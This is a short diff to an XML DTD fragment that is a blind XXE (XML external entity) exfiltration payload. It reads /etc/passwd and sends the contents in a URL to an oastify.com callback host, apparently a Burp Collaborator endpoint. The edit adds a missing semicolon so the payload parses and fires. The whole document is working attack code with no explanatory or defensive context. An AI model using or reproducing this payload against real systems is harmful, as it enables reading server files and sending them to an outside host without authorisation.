@@ -1,3 +1,3 @@
 <!ENTITY % passwd SYSTEM "file:///etc/passwd">
 <!ENTITY % wrapper "<!ENTITY send SYSTEM 'https://dyf1gvynlorlxh9p5pa73125hwnnbfz4.oastify.com/?%passwd;'>">
-%wrapper
+%wrapper;
